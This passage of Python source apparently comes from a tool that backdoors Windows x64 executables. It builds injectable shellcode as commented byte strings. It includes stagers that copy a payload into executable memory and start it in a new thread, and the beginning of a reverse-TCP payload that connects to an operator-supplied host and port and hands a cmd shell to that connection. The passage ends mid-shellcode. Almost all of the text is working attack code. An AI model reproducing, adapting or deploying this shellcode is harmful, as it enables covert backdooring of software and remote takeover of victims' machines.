                           "\xac"                              # lods
                           "\x3c\x61"                          # cmp al, 61h (a)
                           "\x7c\x02"                          # jl 02
                           "\x2c\x20"                          # sub al, 0x20
                           #not_lowercase
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           "\x41\x01\xc1"                      # add r9d, eax
                           "\xe2\xed"                          # loop until read, back to xor rax, rax
                           "\x52"                              # push rdx ; Save the current position in the module list for later
                           "\x41\x51"                          # push r9 ; Save the current module hash for later
                                                               # ; Proceed to itterate the export address table,
                           "\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           "\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           "\x48\x85\xc0"                      # test rax, rax ; Test if no export address table is present
                           "\x74\x67"                          # je get_next_mod1 ; If no EAT present, process the next module
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x50"                              # push rax ; Save the current modules EAT
                           "\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function names
                           "\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function names
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                                                               #; Computing the module hash + function hash
                           #get_next_func: ;
                           "\xe3\x56"                          # jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                           "\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           "\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           "\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                               #  ; And compare it to the one we wan
                           #loop_funcname: ;
                           "\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           "\xac"                              # lodsb ; Read in the next byte of the ASCII function name
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           "\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           "\x38\xe0"                          # cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                           "\x75\xf1"                          # jne loop_funcname ; If we have not reached the null terminator, continue
                           "\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add the current module hash to the function hash
                           "\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                           "\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash if we have not found it
                                                               # ; If found, fix up stack, call the function and then value else compute the next one...
                           "\x58"                              # pop rax ; Restore the current modules EAT
                           "\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           "\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; Get the function addresses table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address to get the functions actual VA
                                                               #; We now fix up the stack and perform the call to the drsired function...
                           #finish:
                           "\x41\x58"                          # pop r8 ; Clear off the current modules hash
                           "\x41\x58"                          # pop r8 ; Clear off the current position in the module list
                           "\x5E"                              # pop rsi ; Restore RSI
                           "\x59"                              # pop rcx ; Restore the 1st parameter
                           "\x5A"                              # pop rdx ; Restore the 2nd parameter
                           "\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           "\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           "\x41\x5A"                          # pop r10 ; pop off the return address
                           "\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                               #  ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                           "\x41\x52"                          # push r10 ; push back the return address
                           "\xFF\xE0"                          # jmp rax ; Jump into the required function
                                                               #; We now automagically return to the correct caller...
                           #get_next_mod: ;
                           "\x58"                              # pop rax ; Pop off the current (now the previous) modules EAT
                           #get_next_mod1: ;
                           "\x41\x59"                          # pop r9 ; Pop off the current (now the previous) modules hash
                           "\x5A"                              # pop rdx ; Restore our position in the module list
                           "\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           "\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           )
        #allocate
        self.shellcode1 += ("\x5d"                              # pop rbp
                            "\x49\xc7\xc6"                      # mov r14, 1abh size of payload...
                            )
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
        self.shellcode1 += ("\x00\x00"
                            "\x6a\x40"                          # push 40h
                            "\x41\x59"                          # pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              # push 1000h
                            "\x41\x58"                          # pop r8.. now 1000h
                            "\x4C\x89\xF2"                      # mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              # push E553a458
                            "\x41\x5A"                          # pop r10
                            "\xff\xd5"                          # call rbp
                            "\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            )
                                                                #mov rcx, 0x1abE
        self.shellcode1 += "\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
        self.shellcode1 += "\x00\x00"

        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43"

                            # got_payload:
        self.shellcode1 += ("\x5e"                                  # pop rsi            ; Prepare ESI with the source to copy
                            "\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0"                          # xor rax,rax
                            "\x50"                                  # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  # push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          # mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          # mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              # call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      # add rsp, 50
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)

        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += "\xE9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))
            #self.shellcode1 += "\xE9\x47\x02\x00\x00"

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def user_supplied_shellcode_threaded(self, flItms, CavesPicked={}):
        """
        User supplies the shellcode, make sure that it EXITs via a thread.
        """

        flItms['stager'] = True

        if flItms['supplied_shellcode'] is None:
            print "[!] User must provide shellcode for this module (-U)"
            return False
        else:
            self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )
        breakupvar = eat_code_caves(flItms, 0, 1)

        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"

        #Can inject any shellcode below.
        if flItms['NewCodeCave'] is False:
            if CavesPicked != {}:
                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])

            else:
                self.shellcode2 += "\x41" * 90

        self.shellcode2 += self.supplied_shellcode

        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = ("\x90"                              # <--THAT'S A NOP. \o/
                           "\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           #api_call
                           "\x41\x51"                          # push r9
                           "\x41\x50"                          # push r8
                           "\x52"                              # push rdx
                           "\x51"                              # push rcx
                           "\x56"                              # push rsi
                           "\x48\x31\xD2"                      # xor rdx,rdx
                           "\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           "\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           "\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           #next_mod
                           "\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           "\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           "\x4d\x31\xc9"                      # xor r9,r9
                           #loop_modname
                           "\x48\x31\xc0"                      # xor rax,rax
                           "\xac"                              # lods
                           "\x3c\x61"                          # cmp al, 61h (a)
                           "\x7c\x02"                          # jl 02
                           "\x2c\x20"                          # sub al, 0x20
                           #not_lowercase
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           "\x41\x01\xc1"                      # add r9d, eax
                           "\xe2\xed"                          # loop until read, back to xor rax, rax
                           "\x52"                              # push rdx ; Save the current position in the module list for later
                           "\x41\x51"                          # push r9 ; Save the current module hash for later
                                                               # ; Proceed to itterate the export address table,
                           "\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           "\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           "\x48\x85\xc0"                      # test rax, rax ; Test if no export address table is present
                           "\x74\x67"                          # je get_next_mod1 ; If no EAT present, process the next module
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x50"                              # push rax ; Save the current modules EAT
                           "\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function names
                           "\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function names
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                                                               #; Computing the module hash + function hash
                           #get_next_func: ;
                           "\xe3\x56"                          # jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                           "\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           "\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           "\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                               #  ; And compare it to the one we wan
                           #loop_funcname: ;
                           "\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           "\xac"                              # lodsb ; Read in the next byte of the ASCII function name
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           "\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           "\x38\xe0"                          # cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                           "\x75\xf1"                          # jne loop_funcname ; If we have not reached the null terminator, continue
                           "\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add the current module hash to the function hash
                           "\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                           "\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash if we have not found it
                                                               # ; If found, fix up stack, call the function and then value else compute the next one...
                           "\x58"                              # pop rax ; Restore the current modules EAT
                           "\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           "\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; Get the function addresses table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address to get the functions actual VA
                                                               #; We now fix up the stack and perform the call to the drsired function...
                           #finish:
                           "\x41\x58"                          # pop r8 ; Clear off the current modules hash
                           "\x41\x58"                          # pop r8 ; Clear off the current position in the module list
                           "\x5E"                              # pop rsi ; Restore RSI
                           "\x59"                              # pop rcx ; Restore the 1st parameter
                           "\x5A"                              # pop rdx ; Restore the 2nd parameter
                           "\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           "\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           "\x41\x5A"                          # pop r10 ; pop off the return address
                           "\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                               # ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                           "\x41\x52"                          # push r10 ; push back the return address
                           "\xFF\xE0"                          # jmp rax ; Jump into the required function
                                                               # ; We now automagically return to the correct caller...
                           #get_next_mod: ;
                           "\x58"                              # pop rax ; Pop off the current (now the previous) modules EAT
                           #get_next_mod1: ;
                           "\x41\x59"                          # pop r9 ; Pop off the current (now the previous) modules hash
                           "\x5A"                              # pop rdx ; Restore our position in the module list
                           "\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           "\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           )
        #allocate
        self.shellcode1 += ("\x5d"                              # pop rbp
                            "\x49\xc7\xc6"                      # mov r14, 1abh size of payload...
                            )
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += ("\x6a\x40"                          # push 40h
                            "\x41\x59"                          # pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              # push 1000h
                            "\x41\x58"                          # pop r8.. now 1000h
                            "\x4C\x89\xF2"                      # mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              # push E553a458
                            "\x41\x5A"                          # pop r10
                            "\xff\xd5"                          # call rbp
                            "\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            )
                            ##mov rcx, 0x1ab
        self.shellcode1 += "\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43"

                            # got_payload:
        self.shellcode1 += ("\x5e"                                 # pop rsi            ; Prepare ESI with the source to copy
                            "\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0"  # xor rax,rax

                            "\x50"                                  # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  # push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          # mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          # mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              # call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      # add rsp, 50

                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)

        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += "\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def iat_reverse_tcp_inline(self, flItms, CavesPicked={}):
        """
        Position dependent shellcode that uses API thunks of LoadLibraryA and
        GetProcAddress to find and load APIs for callback to C2.
        """
        flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress']

        for api in flItms['apis_needed']:
            if api not in flItms:
                return False

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        self.shellcode1 = "\xfc"   # CLD
        self.shellcode1 += "\x49\xBE"           # mov value below to r14
        #Think about putting the LOADLIBA and GETPROCADDRESS in rX regs

        if flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<Q", 0xffffffff + (flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<Q", flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
        #RDX holds entry point
        self.shellcode1 += "\x49\x01\xD6"  # add r14 + RDX
        self.shellcode1 += "\x49\xBF"  # mov value below to r15
        if flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<Q", 0xffffffff + (flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<Q", flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
        self.shellcode1 += "\x49\x01\xD7"  # add r15 + RDX
        #LoadLibraryA in r14
        #GetProcAddress in r15

        '''
        Winx64 asm calling convention
        RCX, RDX, R8, R9 for the first four integer or pointer arguments (in that order),
        and XMM0, XMM1, XMM2, XMM3 are used for floating point arguments. Additional arguments
        are pushed onto the stack (right to left). Integer return values (similar to x86) are
        returned in RAX if 64 bits or less. Floating point return values are returned in XMM0.
        Parameters less than 64 bits long are not zero extended; the high bits are not zeroed.

        The caller reserves space on the stack (unlike x86)
        rbx
        rbp
        r12
        r13
        r14: GetProcAddress
        r15: LoadLibraryA

        '''

        self.shellcode1 += ("\x49\xbb\x77\x73\x32\x5F\x33\x32\x00\x00"       # mov r11, ws2_32
                            "\x41\x53"                                       # push r11
                            "\x49\x89\xE3"                                   # mov r11, rsp
                            "\x48\x81\xEC\xA0\x01\x00\x00"                   # sub rsp, 408+8     # size of WSAData
                            "\x48\x89\xE6"                                   # mov rsi, rsp pointer to WSAData struct
                            "\x48\xBF\x02\x00"
                            )
        self.shellcode1 += struct.pack('!H', self.PORT)
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += ("\x57"                                           # push rdi
                            "\x48\x89\xE7"                                   # mov rdi, rsp pointer to data
                            "\x4C\x89\xD9"                                   # mov rcx, r11 #ws2_32
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xff\x16"                                   # call qword ptr [r14] ; LoadLibA
                            "\x49\x89\xC5"                                   # mov r13, rax ; handle ws2_32 to r13
                            #  handle ws2_32 to r13
                            "\x48\x89\xC1"                                   # mov rcx, rax
                            "\xeb\x0c"                                       # short jmp over api
                            "\x57\x53\x41\x53\x74\x61"                       # WSAStartup
                            "\x72\x74\x75\x70\x00\x00"                       # ...
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # Call qword ptr [r15] ; GetProcAddr
                            "\x48\x95"                                       # xchg rbp, rax ; mov wsastartup to rbp
                            # wsastartup to rbp
                            "\xeb\x0c"                                       # jmp over WSASocketA
                            "\x57\x53\x41\x53\x6f\x63"                       # WSASocketA
                            "\x6b\x65\x74\x41\x00\x00"                       #
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x4C\x89\xE9"                                   # mov rcx, r13
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr WSASocketA
                            "\x49\x94"                                       # xchg r12, rax ; mov WSASocketA to r12
                            # WSASocketA to r12
                            "\x48\x89\xF2"                                   # mov rdx, rsi ; mov point to struct
                            "\x68\x01\x01\x00\x00"                           # push 0x0101
                            "\x59"                                           # pop rcx
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\xff\xd5"                                       # call rbp ; WSAStartup(0x0101, &WSAData);
                            "\x50"                                           # push rax
                            "\x50"                                           # push rax
                            "\x4D\x31\xC0"                                   # xor r8, r8
                            "\x4D\x31\xC9"                                   # xor r9, r9
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC2"                                   # mov rdx, rax
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC1"                                   # mov rdx, rax
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\xD4"                                   # call r12 ;WSASocketA(AF_INT, SOCK_STREAM, 0 0 0 0)
                            "\x49\x94"                                       # xchg r12, rax ; mov socket to r12
                            # get connect
                            "\x48\xBA\x63\x6F\x6E\x6E\x65\x63\x74\x00"       # mov rdx, "connect\x00"
                            "\x52"                                           # push rdx
                            "\x48\x89\xE2"                                   # mov rdx, rsp
                            "\x4C\x89\xE9"                                   # mov rcx, r13; ws2_32 handle
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] ;GetProcAddr connect
                            "\x48\x89\xC3"                                   # mov rbx, rax ;connect api
                            "\x6A\x10"                                       # push 16
                            "\x41\x58"                                       # pop r8
                            "\x48\x89\xFA"                                   # mov rdx, rdi
                            "\x4C\x89\xE1"                                   # mov rcx, r12
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\xFF\xD3"                                       # call rbx ;connect (s, &sockaddr, 16)
                            "\x48\x81\xC4\xb8\x02\x00\x00"                   # add rsp, 0x2b8
                            )
        #socket is in r12

        #breakupvar is the distance between codecaves
        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"  # JMP opcode
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                                 len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)

        self.shellcode2 = ("\xeb\x09"                                        # jump over kernel32
                           "\x6b\x65\x72\x6e\x65\x6c\x33\x32\x00"           # kernel32,00
                           "\x48\x8D\x0D\xF0\xFF\xFF\xFF"                   # lea rcx, [rip-4]
                           "\x48\x83\xEC\x20"                               # sub rsp, 20
                           "\x41\xFF\x16"                                   # call qword ptr [r14]
                           # getprocaddress CreateProcessA
                           "\x49\x89\xC5"                                   # mov r13, rax ; mov kernel32 to r13
                           "\x48\x89\xC1"                                   # mov rcx, rax
                           "\xeb\x0f"                                       # jump over CreateProcessA,0
                           "\x43\x72\x65\x61\x74\x65\x50"                   # CreateProcessA
                           "\x72\x6f\x63\x65\x73\x73\x41\x00"               # ...
                           "\x48\x8D\x15\xEA\xFF\xFF\xFF"                   # lea rdx, [rip - 22]
                           "\x48\x83\xEC\x20"                               # sub rsp, 20
                           "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr CreateProcessA
                           # CreateProcessesA in rax
                           "\x48\x89\xC7"                                   # mov rdi, rax ;mov CreateProcessA to rdi
                           "\x49\x87\xFC"                                   # xchg r12, rdi (socket handle for CreateProcessA)
                           # socket is in rdi
                           # shell:
                           "\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00"       # mov r8, 'cmd'
                           "\x41\x50"                                       # push r8                     ; an extra push for alignment
                           "\x41\x50"                                       # push r8                     ; push our command line: 'cmd',0
                           "\x48\x89\xe2"                                   # mov rdx, rsp                ; save a pointer to the command line
                           "\x57"                                           # push rdi                    ; our socket becomes the shells hStdError
                           "\x57"                                           # push rdi                    ; our socket becomes the shells hStdOutput
                           "\x57"                                           # push rdi                    ; our socket becomes the shells hStdInput
                           "\x4d\x31\xc0"                                   # xor r8, r8                  ; Clear r8 for all the NULL's we need to push
                           "\x6a\x0d"                                       # push byte 13                ; We want to place 104 (13 * 8) null bytes onto the stack
                           "\x59"                                           # pop rcx                     ; Set RCX for the loop
                           # 1 push_loop:                    ;
                           "\x41\x50"                                       # push r8                     ; push a null qword
                           "\xe2\xfc"                                       # loop push_loop              ; keep looping untill we have pushed enough nulls
                           "\x66\xc7\x44\x24\x54\x01\x01"                   # mov word [rsp+84], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
                           "\x48\x8d\x44\x24\x18"                           # lea rax, [rsp+24]           ; Set RAX as a pointer to our STARTUPINFO Structure
                           "\xc6\x00\x68"                                   # mov byte [rax], 104         ; Set the size of the STARTUPINFO Structure
                           "\x48\x89\xe6"                                   # mov rsi, rsp                ; Save the pointer to the PROCESS_INFORMATION Structure
                           #   ; 1 perform the call to CreateProcessA
                           "\x56"                                           # push rsi                    ; Push the pointer to the PROCESS_INFORMATION Structure
                           "\x50"                                           # push rax                    ; Push the pointer to the STARTUPINFO Structure
                           "\x41\x50"                                       # push r8                     ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
                           "\x41\x50"                                       # push r8                     ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
                           "\x41\x50"                                       # push r8                     ; We dont specify any dwCreationFlags
                           "\x49\xff\xc0"                                   # inc r8                      ; Increment r8 to be one
                           "\x41\x50"                                       # push r8                     ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
                           "\x49\xff\xc8"                                   # dec r8                      ; Decrement r8 (third param) back down to zero
